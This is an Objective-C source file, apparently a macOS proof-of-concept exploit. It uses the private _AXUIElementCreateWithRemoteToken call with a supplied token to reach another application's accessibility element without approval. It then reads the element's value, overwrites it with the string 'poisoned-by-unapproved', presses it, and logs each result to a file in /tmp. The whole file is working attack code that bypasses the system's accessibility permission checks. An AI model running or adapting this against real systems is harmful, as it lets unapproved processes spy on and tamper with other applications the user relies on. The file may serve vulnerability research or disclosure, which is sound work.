#import <Cocoa/Cocoa.h>
#import <ApplicationServices/ApplicationServices.h>
extern AXUIElementRef _AXUIElementCreateWithRemoteToken(CFDataRef);
@interface R : NSObject <NSApplicationDelegate> @end
@implementation R
- (void)applicationDidFinishLaunching:(NSNotification *)n {
  NSArray *a = NSProcessInfo.processInfo.arguments;
  NSString *hex = a.count > 1 ? a[1] : @""; NSString *out = a.count > 2 ? a[2] : @"/tmp/poc-unapproved.txt";
  NSMutableData *d = [NSMutableData data];
  for (NSUInteger i = 0; i + 1 < hex.length; i += 2) { unsigned b; sscanf([[hex substringWithRange:NSMakeRange(i,2)] UTF8String], "%2x", &b); uint8_t c = b; [d appendBytes:&c length:1]; }
  NSMutableString *r = [NSMutableString string];
  [r appendFormat:@"AXIsProcessTrusted=%d\n", AXIsProcessTrusted()];
  AXUIElementRef e = _AXUIElementCreateWithRemoteToken((__bridge CFDataRef)d);
  [r appendFormat:@"element_created=%d\n", e != NULL];
  if (e) {
    CFTypeRef v = NULL; AXError err = AXUIElementCopyAttributeValue(e, kAXValueAttribute, &v);
    [r appendFormat:@"read_value_err=%d value=%@\n", err, err == 0 ? (__bridge id)v : @"-"];
    AXError s = AXUIElementSetAttributeValue(e, kAXValueAttribute, CFSTR("poisoned-by-unapproved"));
    [r appendFormat:@"set_value_err=%d\n", s];
    AXError p = AXUIElementPerformAction(e, kAXPressAction);
    [r appendFormat:@"press_err=%d\n", p];
  }
  [r writeToFile:out atomically:YES encoding:NSUTF8StringEncoding error:nil];
  [NSApp terminate:nil];
}
@end
int main(void){ @autoreleasepool { NSApplication *app=[NSApplication sharedApplication]; R *d=[R new]; app.delegate=d; [app run]; } return 0; }
